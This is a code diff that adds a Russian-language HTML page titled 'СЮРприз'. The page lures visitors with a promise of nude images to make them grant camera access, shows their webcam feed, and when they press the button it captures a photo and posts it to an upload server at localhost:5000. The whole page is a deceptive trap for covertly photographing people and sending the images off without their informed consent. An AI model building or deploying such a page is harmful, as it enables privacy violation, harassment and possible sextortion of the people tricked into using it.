@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>СЮРприз</title>
+</head>
+<body>
+    <h1>нажми разрешить и увидишь голые сиськи</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="capture">СЮРприз</button>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+            } catch (error) {
+                console.error("Ошибка при доступе к камере:", error);
+                alert("Не удалось получить доступ к камере.");
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            sendPhoto(imageData);
+        }
+
+        async function sendPhoto(imageData) {
+            try {
+                const response = await fetch('http://localhost:5000/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+                const result = await response.json();
+                alert(result.message);
+            } catch (error) {
+                console.error("Ошибка при отправке фото:", error);
+            }
+        }
+
+        document.getElementById('capture').addEventListener('click', capturePhoto);
+        startCamera();
+    </script>
+</body>
+</html>
